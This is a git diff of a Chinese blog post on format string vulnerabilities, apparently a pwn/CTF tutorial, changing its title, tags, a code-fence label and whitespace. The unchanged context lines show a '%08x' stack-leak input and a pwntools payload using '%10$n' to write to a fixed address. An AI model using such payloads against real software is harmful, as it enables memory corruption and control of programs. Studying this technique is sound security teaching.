@@ -1,9 +1,9 @@
 ---
 layout: post
-title:  "【Pwn】格式化字符串漏洞"
+title:  "格式化字符串漏洞"
 date:   2023-09-10 00:00:00 +0800
 categories: 安全
-tags: 安全 Pwn
+tags: pwn format-string
 comments: 1
 mathjax: true
 copyrights: 原创
@@ -134,7 +134,7 @@ else
 
   我们直接输入
 
-  ```
+  ```plaintext
   leave your message please:
   AAAA%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
   your message is:
@@ -154,7 +154,7 @@ else
   p.recvuntil("leave your message please:\n")
   payload = p32(0x804A068) + b'a' * 0x4 + b'%10$n'
   p.sendline(payload)
-  				
+
   p.interactive()
   ```
 
